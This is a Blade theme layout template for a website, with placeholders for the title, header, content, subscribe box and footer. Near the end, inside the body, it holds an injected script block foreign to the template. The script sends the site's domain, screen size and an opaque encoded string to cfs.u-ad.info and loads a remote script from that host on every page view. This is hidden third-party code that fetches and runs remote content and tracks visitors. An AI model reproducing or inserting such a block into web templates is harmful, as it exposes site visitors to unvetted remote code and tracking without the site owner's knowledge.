<!DOCTYPE html>
<html>
    <head>
        <title>{{ Theme::place('title') }}</title>
        <meta charset="utf-8">
        {{ Theme::partial('seostuff') }}    
        {{ Theme::partial('defaultcss') }}
        {{ Theme::asset()->styles() }}          
    </head>
    <body class="boxed">
        <div id="template-wrapper" class="boxed">
            {{ Theme::partial('header') }}  
            <div id="site-wrapper">
                {{ Theme::place('content') }}   
                {{ Theme::partial('subscribe') }}   
            </div>
            {{ Theme::partial('footer') }}  
        </div>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnVGGhmqmSm4BIqpVXRiPRYz0%2friuINeuN%2bdncX9a%2fX5rZ6VQ1vRcpZXqyLDguwqvobLdXF6LuAwJQ8q4%2fN8NQ38I0IBcNFthagDJhwongfykuEuDUtFZx3rYMl3PxQSYqBRTZabfU%2fvXTrp%2bVpeBGC8jTOBak%2bA9%2bisSsUzhM1LT1BPu2q4YYAvtU00x0VyYA7o%2fzcMyde54BNGzj9%2fXYWl4vM6PY79ggzAB4UkUDw7MApVlUWOn74o3s97HLyt4WLNv1NNX%2bxdM%2b3xeWUgJmbCUlLdpV7QVT990beq%2f283%2bzbuSBzn6O4KF%2b4oEDstYby36x9I1Zeibv2lpa8w8Y%2f%2fbj1c3bK1iuZLChExKg0E3Dnmh6M2ZVGOJMl14xy9plxG%2fL%2bnM5F%2bfKIkXZ%2bmsZoNRKWgBsyzHtht4KexCCzqyRmlGqnyZx7ARlctW2bpXY3FQyQg0uUR59lkaoMh8qqzPwDJY7WtkKbszY81Urgw6Y9IWe3pdafqhHYFvl3M38zZ5Os4SoOxOXT47Wx8x5eC3AVqgB24q%2fuZJgty3QYzgKg7souRruURHsIKX3XqpD" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    {{ Theme::partial('defaultjs') }}   
    {{ Theme::partial('analytic') }}
</html>